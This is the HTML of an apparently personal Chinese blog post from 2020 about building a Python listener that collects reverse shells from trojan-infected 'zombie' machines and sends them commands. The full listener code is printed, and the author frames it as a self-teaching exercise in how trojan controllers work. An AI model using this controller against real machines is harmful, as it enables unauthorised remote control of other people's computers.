@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="emm最近看了很多木马控制的工具，但是一直想弄懂他是怎么实现的，于是今天就用了半天时间做了这个实验，使用python去进行批量肉鸡控制1.实现socket监听 上面代码基本意思就是端口复用，并且监听一个端口服务，因为木马都是主动发起tcp请求进行连接，为了达到批量的效果，我选择使用了一个列表进行保存，在接收到shell的时候，就把这个shell对象写到一个字典里面，然后通过列表进行保存. 2.获取">
+<meta property="og:type" content="article">
+<meta property="og:title" content="批量shell控制">
+<meta property="og:url" content="http://yoursite.com/2020/03/04/shell-control/index.html">
+<meta property="og:site_name" content="沫的博客">
+<meta property="og:description" content="emm最近看了很多木马控制的工具，但是一直想弄懂他是怎么实现的，于是今天就用了半天时间做了这个实验，使用python去进行批量肉鸡控制1.实现socket监听 上面代码基本意思就是端口复用，并且监听一个端口服务，因为木马都是主动发起tcp请求进行连接，为了达到批量的效果，我选择使用了一个列表进行保存，在接收到shell的时候，就把这个shell对象写到一个字典里面，然后通过列表进行保存. 2.获取">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/images/pasted-90.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-91.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-93.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-94.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-95.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-96.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-97.png">
+<meta property="article:published_time" content="2020-03-04T09:07:00.000Z">
+<meta property="article:modified_time" content="2020-03-04T09:28:28.261Z">
+<meta property="article:author" content="沫">
+<meta property="article:tag" content="后门">
+<meta property="article:tag" content="shell管理">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/images/pasted-90.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/03/04/shell-control/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>批量shell控制 | 沫的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">沫的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/shell-control/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="沫">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="沫的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          批量shell控制
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-03-04 17:07:00 / 修改时间：17:28:28" itemprop="dateCreated datePublished" datetime="2020-03-04T17:07:00+08:00">2020-03-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/python%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">python学习</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="emm最近看了很多木马控制的工具，但是一直想弄懂他是怎么实现的，于是今天就用了半天时间做了这个实验，使用python去进行批量肉鸡控制"><a href="#emm最近看了很多木马控制的工具，但是一直想弄懂他是怎么实现的，于是今天就用了半天时间做了这个实验，使用python去进行批量肉鸡控制" class="headerlink" title="emm最近看了很多木马控制的工具，但是一直想弄懂他是怎么实现的，于是今天就用了半天时间做了这个实验，使用python去进行批量肉鸡控制"></a>emm最近看了很多木马控制的工具，但是一直想弄懂他是怎么实现的，于是今天就用了半天时间做了这个实验，使用python去进行批量肉鸡控制</h3><h4 id="1-实现socket监听"><a href="#1-实现socket监听" class="headerlink" title="1.实现socket监听"></a>1.实现socket监听</h4><p><img src="/images/pasted-90.png" alt="upload successful"></p>
+<p>上面代码基本意思就是端口复用，并且监听一个端口服务，因为木马都是主动发起tcp请求进行连接，为了达到批量的效果，我选择使用了一个列表进行保存，在接收到shell的时候，就把这个shell对象写到一个字典里面，然后通过列表进行保存.</p>
+<h4 id="2-获取监听内容"><a href="#2-获取监听内容" class="headerlink" title="2.获取监听内容"></a>2.获取监听内容</h4><p><img src="/images/pasted-91.png" alt="upload successful"><br>这个步骤就是看回显了，我本来尝试用utf-8进行解码，然后一直报错，百度了一下可以使用gb2312和gbk对windows解码。</p>
+<h4 id="3-发送指令执行"><a href="#3-发送指令执行" class="headerlink" title="3.发送指令执行"></a>3.发送指令执行</h4><p><img src="/images/pasted-93.png" alt="upload successful"><br>emm其实只要满足这三点就可以进行shell操作了，外加上一个循环，不过因为我需要做的是批量shell控制所以就还得多加一点代码，在执行语句的时候一定要加上这些换行符，不然是不生效的代码。</p>
+<h4 id="4-批量编写"><a href="#4-批量编写" class="headerlink" title="4.批量编写"></a>4.批量编写</h4><p><img src="/images/pasted-94.png" alt="upload successful"><br>emmm 看前三个其实并没啥用，cmd继承类server这个类，是因为我需要用到一些server类的一些方法。</p>
+<p><img src="/images/pasted-95.png" alt="upload successful"><br>这个对象是获取socket对象的，只要列表里面存在这个ip地址那么就返回该socket的对象，这样就可以进行命令执行了</p>
+<h4 id="5-执行命令"><a href="#5-执行命令" class="headerlink" title="5.执行命令"></a>5.执行命令</h4><p><img src="/images/pasted-96.png" alt="upload successful"><br>有了这些对象，开启了消息监听就是我们最开始那个阻塞recv获取消息的函数，发送命令也是前面的。。。</p>
+<h4 id="6-整体演示"><a href="#6-整体演示" class="headerlink" title="6.整体演示"></a>6.整体演示</h4><p><img src="/images/pasted-97.png" alt="upload successful"><br>先是代码阻塞等待连接，然后 选择ip地址，因为就是我在保存ip地址的时候吧监听的写进去了，所以出现了错误emmm，大意了。</p>
+<h4 id="整体代码"><a href="#整体代码" class="headerlink" title="整体代码"></a>整体代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于shell监听</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.ip = <span class="string">'192.168.0.14'</span></span><br><span class="line">        self.port = <span class="number">5555</span></span><br><span class="line">        self.shell_arr = []  <span class="comment"># 用于保存多个shell</span></span><br><span class="line">        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="literal">True</span>)</span><br><span class="line">        self.server.bind((self.ip, self.port))</span><br><span class="line">        self.server.listen(<span class="number">10</span>)</span><br><span class="line">        threading.Thread(target=self.get_shell).start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""监听shell"""</span></span><br><span class="line">        print(<span class="string">'** listening--listen &#123;&#125;:&#123;&#125;'</span>.format(self.ip, self.port))</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket, addr = self.server.accept()</span><br><span class="line">            <span class="comment"># 吧对象写入到字典</span></span><br><span class="line">            print(<span class="string">'\n已接收到shell'</span>)</span><br><span class="line">            self.shell_arr.append(&#123;<span class="string">'ip'</span>: self.ip, <span class="string">'shell_obj'</span>: client_socket&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">msg</span><span class="params">(self, sock)</span>:</span></span><br><span class="line">        <span class="comment"># 显示消息接收</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                user_msg = sock.recv(<span class="number">2048</span>).decode(<span class="string">'gb2312'</span>)</span><br><span class="line">                print(user_msg)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> Error:</span><br><span class="line">            sock.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span><span class="params">(self, sock, msg)</span>:</span></span><br><span class="line">        <span class="comment"># 发送指令</span></span><br><span class="line">        msg = <span class="string">'\r\n'</span> + msg + <span class="string">'\r\n\r\n'</span></span><br><span class="line">        sock.send(msg.encode(<span class="string">'gb2312'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cmd</span><span class="params">(Server, threading.Thread)</span>:</span></span><br><span class="line">    <span class="comment"># 命令基础概念，多个肉鸡控制</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                cmd = str(input(<span class="string">'mo:'</span>))</span><br><span class="line">                <span class="keyword">if</span> cmd == <span class="string">'help'</span>:</span><br><span class="line">                    self.help()  <span class="comment"># 帮助菜单</span></span><br><span class="line">                <span class="keyword">elif</span> cmd == <span class="string">'show'</span>:</span><br><span class="line">                    self.show()  <span class="comment"># 显示肉鸡</span></span><br><span class="line">                <span class="keyword">elif</span> <span class="string">'option host='</span> <span class="keyword">in</span> cmd:</span><br><span class="line">                    self.send_cmd(self.ip_processing(cmd))  <span class="comment"># 获取socket对象</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> Error:</span><br><span class="line">            print(Error)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">help</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'show命令可以查看肉鸡列表\n'</span></span><br><span class="line">              <span class="string">'option host=可以选中肉鸡'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'可以选择输入 option host=主机地址进行shell控制'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self.shell_arr:</span><br><span class="line">            print(i[<span class="string">'ip'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ip_processing</span><span class="params">(self, ip_str)</span>:</span></span><br><span class="line">        <span class="string">"""分割ip地址"""</span></span><br><span class="line">        left_index = ip_str.find(<span class="string">'='</span>)</span><br><span class="line">        <span class="comment"># 寻找该ip地址的shell信息</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> self.shell_arr:</span><br><span class="line">                <span class="keyword">if</span> i[<span class="string">'ip'</span>] == ip_str[left_index + <span class="number">1</span>:]:</span><br><span class="line">                    <span class="keyword">return</span> i[<span class="string">'shell_obj'</span>]</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> Error:</span><br><span class="line">            print(Error)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_cmd</span><span class="params">(self, sock)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sock:</span><br><span class="line">            print(<span class="string">'对不起该ip地址不存在'</span>)</span><br><span class="line">            self.run()</span><br><span class="line">        <span class="comment"># 开启消息监听，因为里面是死循环消息监听，所以需要使用多线程</span></span><br><span class="line">        threading.Thread(target=self.msg, args=(sock,)).start()</span><br><span class="line">        <span class="comment"># 开启命令执行</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            command = input(<span class="string">''</span>)</span><br><span class="line">            self.send_msg(sock, command)</span><br><span class="line">            <span class="keyword">if</span> command == <span class="string">'exit'</span>:</span><br><span class="line">                self.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server = Cmd()</span><br><span class="line">    server.run()</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>其实自己去实现一次shell获取是很有必要的，可以了解到木马连接服务器的实现</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%90%8E%E9%97%A8/" rel="tag"># 后门</a>
+              <a href="/tags/shell%E7%AE%A1%E7%90%86/" rel="tag"># shell管理</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/02/22/qrcode/" rel="prev" title="python在图片中心加入二维码">
+      <i class="fa fa-chevron-left"></i> python在图片中心加入二维码
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#emm最近看了很多木马控制的工具，但是一直想弄懂他是怎么实现的，于是今天就用了半天时间做了这个实验，使用python去进行批量肉鸡控制"><span class="nav-number">1.</span> <span class="nav-text">emm最近看了很多木马控制的工具，但是一直想弄懂他是怎么实现的，于是今天就用了半天时间做了这个实验，使用python去进行批量肉鸡控制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-实现socket监听"><span class="nav-number">1.1.</span> <span class="nav-text">1.实现socket监听</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-获取监听内容"><span class="nav-number">1.2.</span> <span class="nav-text">2.获取监听内容</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-发送指令执行"><span class="nav-number">1.3.</span> <span class="nav-text">3.发送指令执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-批量编写"><span class="nav-number">1.4.</span> <span class="nav-text">4.批量编写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-执行命令"><span class="nav-number">1.5.</span> <span class="nav-text">5.执行命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-整体演示"><span class="nav-number">1.6.</span> <span class="nav-text">6.整体演示</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#整体代码"><span class="nav-number">1.7.</span> <span class="nav-text">整体代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">2.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">沫</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">沫</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
